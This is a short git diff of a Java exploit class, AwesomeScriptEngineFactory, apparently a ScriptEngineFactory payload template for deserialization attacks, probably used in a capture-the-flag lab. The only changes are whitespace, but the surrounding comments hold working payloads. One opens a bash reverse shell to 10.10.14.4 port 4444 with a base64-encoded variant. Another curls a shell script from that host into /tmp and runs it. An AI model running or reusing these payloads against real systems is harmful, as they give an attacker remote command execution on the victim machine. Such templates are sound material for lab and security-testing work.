@@ -18,9 +18,9 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
     /*
      * Additional payload examples - replace the constructor above with one of these:
-     * 
+     *
      * Example 1 - Reverse shell payloads:
-     * 
+     *
      * public AwesomeScriptEngineFactory() {
      *     String [] cmd={"bash","-c","bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"};
      *     String [] jex={"bash","-c","{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"};
@@ -32,10 +32,10 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
      *         e.printStackTrace();
      *     }
      * }
-     * 
+     *
      * Example 2 - Download and execute payload:
      * (Note: add the RunCmd method below to the class when using this)
-     * 
+     *
      * public AwesomeScriptEngineFactory() {
      *     RunCmd("curl 10.10.14.4/shell.sh -o /tmp/shell.sh");
      *     RunCmd("bash /tmp/shell.sh");
